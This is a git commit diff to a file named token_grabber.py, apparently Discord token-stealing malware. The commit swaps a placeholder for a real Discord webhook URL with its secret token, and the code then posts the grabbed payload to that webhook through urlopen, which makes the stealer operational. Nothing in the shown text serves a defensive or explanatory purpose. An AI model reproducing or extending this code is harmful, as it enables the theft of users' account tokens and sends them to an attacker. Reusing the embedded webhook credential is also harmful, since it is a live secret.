77096cc69bb9191aaaa0b62b6aaa606dfe0155d4
Furr_Rblx <160376995+FurrRblx@users.noreply.github.com>
2024-04-09 21:12:41 -0400

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1227009896667418684/EKKT-7Gz1ehWFjLFtGdh387sSic4tRC5cCsXODXdiYmcCUVJg_-WaEiQ3xLbMCU-Q5iE', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
